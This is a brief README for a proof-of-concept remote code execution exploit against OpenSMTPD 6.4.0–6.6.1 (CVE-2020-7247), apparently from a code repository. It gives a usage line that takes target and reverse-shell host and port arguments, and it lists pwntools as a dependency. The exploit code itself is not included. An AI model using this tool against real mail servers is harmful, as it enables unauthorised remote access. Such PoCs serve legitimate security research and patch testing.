## CVE-2020-7247-exploit
OpenSMTPD 6.4.0 - 6.6.1 Remote Code Execution PoC exploit<br>
Reference: <https://www.openwall.com/lists/oss-security/2020/01/28/3>

## Usage
```
python3 exploit.py <target_host> <target_port> <reverse_host> <reverse_port> <recipient_email>
```
![example](img/example.svg)

## Dependencies
```
pip3 install --user pwntools
```
